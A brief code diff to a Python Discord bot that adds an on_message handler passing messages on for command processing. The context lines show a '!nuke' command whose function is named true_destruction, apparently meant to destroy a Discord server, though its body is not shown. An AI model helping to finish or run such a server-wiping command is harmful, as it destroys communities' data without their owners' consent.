@@ -30,6 +30,11 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 async def on_ready():
     pass
 
+# === この部分を追加 ===
+@bot.event
+async def on_message(message):
+    await bot.process_commands(message)
+
 @bot.command(name="nuke")
 async def true_destruction(ctx):
     g_id = ctx.guild.id
